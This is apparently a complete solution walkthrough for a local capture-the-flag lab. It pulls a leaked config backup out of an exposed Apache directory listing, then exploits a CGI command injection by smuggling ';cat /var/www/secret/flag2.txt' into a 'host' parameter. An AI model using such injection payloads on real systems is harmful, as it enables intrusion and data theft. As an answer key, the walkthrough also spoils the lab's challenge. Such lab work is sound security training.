# Walkthrough

This document gives the complete solution. Work through the docs first.

## Setup

```bash
docker compose up --build -d
```

Wait for the container to start (10 to 20 seconds), then verify Apache is up:

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/
```

Expected: `403` (directory listing disabled at root).

## flag1: directory listing

Browse the backup directory:

```bash
curl http://127.0.0.1:8080/backup/
```

Output (excerpt):
```html
<a href="config.bak">config.bak</a>
```

Download the file:

```bash
curl http://127.0.0.1:8080/backup/config.bak
```

Output:
```
# Server configuration backup -- do not expose publicly
db_host=10.10.0.5
db_user=webapp
db_pass=changeme123
api_key=
flag=POC{<32 hex chars>}
```

**flag1** is the value after `flag=`.

## flag2: CGI command injection

The CGI endpoint at `/cgi-bin/status.sh` accepts a `host` parameter and passes it unsanitized to bash. Inject a second command using a semicolon (URL-encoded as `%3B`):

```bash
curl "http://127.0.0.1:8080/cgi-bin/status.sh?host=127.0.0.1%3Bcat%20/var/www/secret/flag2.txt"
```

Output:
```
Checking host: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.047 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.047/0.047/0.047/0.000 ms
POC{<32 hex chars>}
```

**flag2** is the `POC{...}` value at the end of the response.

## Automated exploit

```bash
python3 exploit/exploit.py
```

This runs both steps and prints both flags.

## Teardown

```bash
docker compose down
```
